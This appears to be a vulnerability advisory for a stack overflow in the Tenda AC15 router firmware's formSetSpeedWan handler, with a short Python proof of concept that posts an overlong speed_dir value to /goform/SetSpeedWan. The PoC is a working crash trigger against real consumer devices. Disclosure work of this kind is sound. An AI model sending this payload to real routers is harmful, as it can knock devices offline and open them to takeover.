## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `formSetSpeedWan` function. The `v7` variable receives the `speed_dir` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided  `v7` can trigger this security vulnerability.

![image-20240305231334076](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231334076.png)

![image-20240314175819226](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314175819226.png)

![image-20240305231353586](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231353586.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSpeedWan"
payload = b"a"*1000

data = {"speed_dir": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314175837384](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314175837384.png)
